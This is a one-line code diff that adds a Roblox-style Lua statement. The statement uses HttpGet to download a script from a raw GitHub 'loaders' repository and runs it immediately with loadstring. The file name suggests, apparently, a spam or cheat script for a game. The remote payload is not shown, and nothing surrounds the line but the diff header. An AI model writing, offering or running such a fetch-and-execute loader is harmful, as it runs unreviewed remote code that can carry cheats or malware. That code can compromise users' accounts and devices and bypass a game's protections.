@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/makeup-star-spam7-wbzrvda8kym0oe.lua"))()
